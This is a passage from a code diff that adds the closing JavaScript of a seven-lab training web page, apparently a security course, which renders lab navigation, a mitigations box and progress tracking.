+      <div class="fix-box"><p>Recommended mitigations:</p>${fixHtml}</div>
+    </div>
+  </div>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="show(${lab.id - 1})" ${lab.id === 1 ? 'disabled' : ''}>← Previous</button>
+    <span class="progress-info">${done.size} of 7 complete</span>
+    ${!isDone ? `<button class="complete-btn" onclick="markDone(${lab.id})">Mark complete ${isLast ? '' : '→'}</button>` : isLast ? `<button class="nav-btn" disabled>All done!</button>` : `<button class="nav-btn" onclick="show(${lab.id + 1})">Next lab →</button>`}
+  </div>`;
+}
+
+function show(id) {
+  current = id;
+  document.querySelectorAll('.lab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(`btn-${id}`).classList.add('active');
+  const mc = document.getElementById('main-content');
+  mc.innerHTML = id === 0 ? overviewContent() : labContent(labs[id]);
+  mc.scrollTop = 0;
+}
+
+function markDone(id) {
+  done.add(id);
+  const num = document.getElementById(`num-${id}`);
+  num.textContent = '✓';
+  document.getElementById(`btn-${id}`).classList.add('done');
+  const fill = Math.round((done.size / 7) * 100);
+  document.getElementById('prog-fill').style.width = fill + '%';
+  document.getElementById('progress-label').textContent = done.size + ' of 7 complete';
+  if (id < 7) {
+    show(id + 1);
+  } else {
+    show(id);
+  }
+}
+
+show(0);
+</script>
